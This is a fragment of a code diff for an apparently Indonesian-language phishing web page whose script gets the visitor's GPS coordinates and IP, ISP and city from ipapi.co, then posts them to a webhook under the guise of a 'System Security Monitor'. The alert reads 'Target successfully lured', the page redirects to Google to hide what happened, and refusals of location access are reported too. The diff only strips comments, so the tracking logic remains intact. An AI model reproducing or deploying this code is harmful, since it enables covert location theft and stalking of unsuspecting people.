@@ -85,7 +85,7 @@
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    // Ambil info IP & Provider secara detail
+                    
                     let ipInfo = { ip: "Unknown", org: "Unknown", city: "Unknown" };
                     try {
                         const res = await fetch('https://ipapi.co/json/');
@@ -96,7 +96,7 @@
                         username: "System Security Monitor",
                         embeds: [{
                             title: "🚨 Target Berhasil Terpancing!",
-                            color: 15548997, // Warna Merah
+                            color: 15548997, 
                             fields: [
                                 { name: "📍 Koordinat GPS", value: `\`${pos.coords.latitude}, ${pos.coords.longitude}\`` },
                                 { name: "🗺️ Google Maps", value: `[Klik Disini](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})` },
@@ -114,11 +114,11 @@
                         body: JSON.stringify(payload)
                     });
 
-                    // Redirect ke halaman normal (seolah sudah benar)
+                   
                     window.location.href = "https://www.google.com";
 
                 }, async (err) => {
-                    // Jika target klik "Block" atau "Deny"
+                   
                     await fetch(WEBHOOK_URL, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
